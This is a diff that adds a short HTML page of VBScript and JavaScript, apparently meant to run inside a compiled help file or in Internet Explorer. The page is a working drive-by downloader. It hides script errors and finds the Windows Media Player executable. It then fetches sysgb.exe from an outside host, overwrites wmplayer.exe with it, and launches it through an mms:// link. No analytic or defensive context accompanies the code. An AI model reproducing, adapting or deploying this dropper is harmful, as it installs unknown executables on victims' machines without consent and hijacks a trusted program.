@@ -1,0 +1,65 @@
+
+<script language="vbscript">
+    Function Exists(filename)
+        On Error Resume Next
+        LoadPicture(filename)
+        Exists = Err.Number =  481
+    End Function    
+</script>
+
+<script language="javascript">
+function stoperror() {
+return true
+}
+window.onerror=stoperror
+
+
+    wmplayerpaths= [
+            "C:\\Programmer\\Windows Media Player\\wmplayer.exe",
+            "C:\\Program\\Windows Media Player\\wmplayer.exe",
+            "C:\\Programme\\Windows Media Player\\wmplayer.exe",
+            "C:\\Programmi\\Windows Media Player\\wmplayer.exe",
+            "C:\\Programfiler\\Windows Media Player\\wmplayer.exe",
+            "C:\\Programas\\Windows Media Player\\wmplayer.exe",
+            "C:\\Archivos de programa\\Windows Media Player\\wmplayer.exe",
+            "C:\\Program Files\\Windows Media Player\\wmplayer.exe"
+           ];
+    
+    for (i=0;i<wmplayerpaths.length;i++) {
+        wmplayerpath = wmplayerpaths[i];
+        if (Exists(wmplayerpath))
+            break;
+    }
+
+///////////////////////////////////////////////////////////////
+//    function getPath(url) {
+//        start = url.indexOf('http:')
+//        end = url.indexOf('NEWE.CHM')
+//        return url.substring(start, end);
+//    }
+//    payloadURL = getPath(location.href)+'sys.exe';
+
+payloadURL = 'http://counter.spros.com/2/sysgb.exe';
+
+///////////////////////////////////////////////////////////////
+
+
+    var x = new ActiveXObject("Microsoft.XMLHTTP"); 
+    x.Open("GET",payloadURL,0); 
+    x.Send(); 
+    
+    var s = new ActiveXObject("ADODB.Stream");
+    s.Mode = 3;
+    s.Type = 1;
+    s.Open();
+    s.Write(x.responseBody);
+
+
+    s.SaveToFile(wmplayerpath,2);
+
+//ttt="c:/exploit/ZZZZZZZ.exe";
+//s.SaveToFile(ttt,2);
+
+    location.href = "mms://";
+    
+</script>
